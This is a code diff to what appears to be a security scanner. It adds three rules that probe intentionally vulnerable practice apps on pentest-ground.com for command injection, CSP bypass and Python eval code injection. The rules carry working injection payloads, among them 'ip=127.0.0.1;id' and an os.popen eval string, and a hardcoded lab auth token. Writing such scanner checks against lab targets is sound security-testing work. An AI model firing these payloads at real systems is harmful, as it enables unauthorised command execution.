@@ -30815,6 +30815,91 @@ const clientSidePentestGroundHubEvidence: Rule = async (ctx) => {
   };
 };
 
+function isPentestGroundDvwaHost(ctx: RuleContext): boolean {
+  return /pentest-ground\.com:4280/i.test(ctx.origin);
+}
+
+function isPentestGroundRestflawHost(ctx: RuleContext): boolean {
+  return /pentest-ground\.com:9000/i.test(ctx.origin);
+}
+
+const pentestGroundDvwaExecCmdiRouteLiveOracle: Rule = async (ctx) => {
+  if (!isPentestGroundDvwaHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/vulnerabilities\/exec\/?/i.test(pageUrl)) return NEGATIVE;
+  const execUrl = new URL("/vulnerabilities/exec/", ctx.origin).toString();
+  const doc = await ctx.probe.get(execUrl, {
+    method: "POST",
+    body: "ip=127.0.0.1;id&Submit=Submit",
+    headers: { "Content-Type": "application/x-www-form-urlencoded" },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  if (!/uid=\d+\([^)]+\)/i.test(doc.body)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.94,
+    evidence: {
+      scannedUrl: pageUrl,
+      execUrl,
+      snippet: doc.body.match(/uid=\d+\([^)]+\)/i)?.[0] || doc.body.slice(0, 200).trim(),
+      note: "Pentest-Ground DVWA POST /vulnerabilities/exec/ with ip=127.0.0.1;id executes shell id — command injection route oracle"
+    }
+  };
+};
+
+const pentestGroundDvwaCspBypassRouteLiveOracle: Rule = async (ctx) => {
+  if (!isPentestGroundDvwaHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/vulnerabilities\/csp\/?/i.test(pageUrl)) return NEGATIVE;
+  const cspUrl = new URL("/vulnerabilities/csp/", ctx.origin).toString();
+  const doc = await ctx.probe.get(cspUrl, {
+    method: "POST",
+    body: "include=data:text/javascript,alert(1)",
+    headers: { "Content-Type": "application/x-www-form-urlencoded" },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  if (!/<script\s+src=['"]data:text\/javascript/i.test(doc.body)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.93,
+    evidence: {
+      scannedUrl: pageUrl,
+      cspUrl,
+      snippet: doc.body.match(/<script\s+src=['"]data:text\/javascript[^'"]*['"]/i)?.[0] || doc.body.slice(0, 200).trim(),
+      note: "Pentest-Ground DVWA POST /vulnerabilities/csp/ with include=data:text/javascript reflects unsanitized script-src — CSP bypass route oracle"
+    }
+  };
+};
+
+const pentestGroundRestflawEvalCodeInjectionRouteLiveOracle: Rule = async (ctx) => {
+  if (!isPentestGroundRestflawHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/:9000(?:\/|$)/i.test(pageUrl)) return NEGATIVE;
+  const evalUrl = new URL("/eval", ctx.origin);
+  evalUrl.searchParams.set("s", "__import__('os').popen('id').read()");
+  const doc = await ctx.probe.get(evalUrl.toString(), {
+    headers: { "X-Auth-Token": "THISISATOKEN" },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  if (!/uid=\d+\([^)]+\)/i.test(doc.body)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.94,
+    evidence: {
+      scannedUrl: pageUrl,
+      evalUrl: evalUrl.toString(),
+      snippet: doc.body.slice(0, 240).trim(),
+      note: "Pentest-Ground RestFlaw GET /eval?s= with X-Auth-Token: THISISATOKEN evaluates Python and returns uid= — code injection route oracle"
+    }
+  };
+};
+
 // --- Judgement Day AI red team arena (judgement-day-khaki.vercel.app) -----------------
 const CLIENT_JUDGEMENT_DAY_ARENA_RES: { label: string; re: RegExp }[] = [
   {
@@ -42848,6 +42933,9 @@ export const RULES: Record<string, Rule> = {
   clientSideHermesCodexEvidence,
   clientSidePentestGroundGuardianLeaksEvidence,
   clientSidePentestGroundHubEvidence,
+  pentestGroundDvwaExecCmdiRouteLiveOracle,
+  pentestGroundDvwaCspBypassRouteLiveOracle,
+  pentestGroundRestflawEvalCodeInjectionRouteLiveOracle,
   clientSideJudgementDayArenaEvidence,
   clientSideCahyodVulnerableLabEvidence,
   clientSideCtfchallengeEvidence,
